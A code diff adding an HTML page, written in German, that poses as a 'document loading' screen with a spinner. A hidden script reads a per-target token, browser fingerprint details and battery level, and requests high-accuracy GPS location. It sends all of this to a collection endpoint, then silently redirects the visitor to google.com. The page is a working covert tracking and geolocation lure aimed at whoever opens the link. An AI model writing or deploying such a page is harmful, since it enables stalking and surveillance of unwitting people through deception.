@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Dokument wird geladen…</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #f8f9fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: #333;
+    }
+    .loader {
+      text-align: center;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #dee2e6;
+      border-top-color: #0d6efd;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    p { color: #6c757d; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Dokument wird geladen…</p>
+  </div>
+
+  <script>
+  (function() {
+    const TOKEN = "{{ token }}";
+    const ENDPOINT = "/api/collect";
+
+    const payload = {
+      token: TOKEN,
+      screen: window.screen.width + "x" + window.screen.height,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language,
+      battery: null,
+      gps_lat: null,
+      gps_lon: null,
+      gps_accuracy: null,
+      extra: {
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        connection: navigator.connection
+          ? navigator.connection.effectiveType
+          : null,
+      }
+    };
+
+    // 1. Akku-Info (wenn verfügbar)
+    function sendData() {
+      fetch(ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).finally(() => {
+        // Kurze Verzögerung, dann unsichtbar weiterleiten
+        setTimeout(() => {
+          window.location.replace("https://www.google.com");
+        }, 1800);
+      });
+    }
+
+    // 2. GPS anfragen
+    function requestGPS(thenSend) {
+      if (!navigator.geolocation) {
+        thenSend();
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          payload.gps_lat = pos.coords.latitude;
+          payload.gps_lon = pos.coords.longitude;
+          payload.gps_accuracy = pos.coords.accuracy;
+          thenSend();
+        },
+        () => thenSend(),
+        { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
+      );
+    }
+
+    // 3. Akku, dann GPS, dann senden
+    if (navigator.getBattery) {
+      navigator.getBattery().then(b => {
+        payload.battery = b.level;
+        requestGPS(sendData);
+      }).catch(() => requestGPS(sendData));
+    } else {
+      requestGPS(sendData);
+    }
+  })();
+  </script>
+</body>
+</html>
